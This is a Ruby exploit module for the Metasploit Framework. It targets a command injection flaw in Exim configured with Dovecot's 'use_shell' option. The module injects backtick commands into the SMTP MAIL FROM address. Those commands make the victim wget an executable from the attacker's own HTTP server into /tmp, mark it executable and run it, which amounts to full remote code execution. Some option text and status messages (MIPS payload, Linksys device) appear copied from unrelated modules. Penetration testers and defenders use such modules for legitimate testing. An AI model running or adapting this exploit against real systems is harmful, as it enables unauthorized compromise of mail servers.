##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Smtp
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Exim and Dovecot Insecure Configuration Command Injection',
      'Description'    => %q{
          This module exploits a command injection vulnerability against Dovecot with 
        Exim using the "use_shell" option. It uses the sender's address to inject arbitary
        commands since this is one of the user-controlled variables, which has been
        successfully tested on Debian Squeeze using the default Exim4 with dovecot-common
        packages.
      },
      'Author'         =>
        [
          'Unknown', # From redteam-pentesting # Vulnerability Discovery and PoC
          'eKKiM', # PoC
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '93004' ],
          [ 'EDB', '25297' ],
          [ 'URL', 'https://www.redteam-pentesting.de/advisories/rt-sa-2013-001' ]
        ],
      'Privileged'     => false,
      'Arch'           => ARCH_X86,
      'Platform'       => 'linux',
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Targets'        =>
        [
          [ 'Linux x86', { }],
        ],
      'DisclosureDate' => 'May 03 2013',
      'DefaultTarget'  => 0))

      register_options(
      [
        OptString.new('EHLO', [ true, 'TO address of the e-mail', 'debian.localdomain']),
        OptString.new('MAILTO', [ true, 'TO address of the e-mail', 'root@debian.localdomain']),
        OptAddress.new('DOWNHOST', [ false, 'An alternative host to request the MIPS payload from' ]),
        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),
        OptPort.new('SRVPORT', [ true, 'The daemon port to listen on', 80 ]),
        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 60])
      ], self.class)

      deregister_options('MAILFROM')
  end

  # wait for the data to be sent
  def wait_linux_payload
    print_status("#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...")

    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore['HTTP_DELAY'])
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?")
      end
    end
  end

  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    if (not @pl)
      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!")
      return
    end
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
  end

  def exploit

    @pl = generate_payload_exe
    @elf_sent = false

    #
    # start our web server to deploy the final payload
    #
    downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(8))
    resource_uri = '/' + downfile

    if (datastore['DOWNHOST'])
      service_url_payload = datastore['DOWNHOST'] + resource_uri
    else

      # Needs to be on the port 80
      if datastore['SRVPORT'].to_i != 80
        fail_with(Exploit::Failure::Unknown, 'The Web Server needs to live on SRVPORT=80')
      end

      #do not use SSL
      if datastore['SSL']
        ssl_restore = true
        datastore['SSL'] = false
      end

      #we use SRVHOST as download IP for the coming wget command.
      #SRVHOST needs a real IP address of our download host
      if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
        srv_host = Rex::Socket.source_address(rhost)
      else
        srv_host = datastore['SRVHOST']
      end

      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri
      service_url_payload = srv_host + resource_uri
      print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")
      start_service({'Uri' => {
        'Proc' => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        'Path' => resource_uri
      }})

      datastore['SSL'] = true if ssl_restore
    end


    connect

    print_status("#{rhost}:#{rport} - Server: #{self.banner.to_s.strip}")
    if self.banner.to_s !~ /Exim /
      disconnect
      fail_with(Exploit::Failure::NoTarget, "#{rhost}:#{rport} - The target server is not running Exim!")
    end

    ehlo = datastore['EHLO']
    ehlo_resp = raw_send_recv("EHLO #{ehlo}\r\n")
    ehlo_resp.each_line do |line|
      print_status("#{rhost}:#{rport} - EHLO: #{line.strip}")
    end

    #
    # Initiate the message
    #
    filename = rand_text_alpha_lower(8)
    from = rand_text_alpha(3)
    from << "`/usr/bin/wget${IFS}#{service_url_payload}${IFS}-O${IFS}/tmp/#{filename}`"
    from << "`chmod${IFS}+x${IFS}/tmp/#{filename}`"
    from << "`/tmp/#{filename}`"
    from << "@#{ehlo}"
    to   = datastore['MAILTO']

    resp = raw_send_recv("MAIL FROM: #{from}\r\n")
    resp ||= 'no response'
    msg = "MAIL: #{resp.strip}"
    if not resp or resp[0,3] != '250'
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - #{msg}")
    else
      print_status("#{rhost}:#{rport} - #{msg}")
    end

    resp = raw_send_recv("RCPT TO: #{to}\r\n")
    resp ||= 'no response'
    msg = "RCPT: #{resp.strip}"
    if not resp or resp[0,3] != '250'
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - #{msg}")
    else
      print_status("#{rhost}:#{rport} - #{msg}")
    end

    resp = raw_send_recv("DATA\r\n")
    resp ||= 'no response'
    msg = "DATA: #{resp.strip}"
    if not resp or resp[0,3] != '354'
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - #{msg}")
    else
      print_status("#{rhost}:#{rport} - #{msg}")
    end

    message = "Subject: test\r\n"
    message <<  "\r\n"
    message << ".\r\n"

    resp = raw_send_recv(message)
    msg = "DELIVER: #{resp.strip}"
    if not resp or resp[0,3] != '250'
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - #{msg}")
    else
      print_status("#{rhost}:#{rport} - #{msg}")
    end
    disconnect

    # wait for payload download
    if (datastore['DOWNHOST'])
      print_status("#{rhost}:#{rport} - Giving #{datastore['HTTP_DELAY']} seconds to the Linksys device to download the payload")
      select(nil, nil, nil, datastore['HTTP_DELAY'])
    else
      wait_linux_payload
    end
    register_file_for_cleanup("/tmp/#{filename}")

  end

end
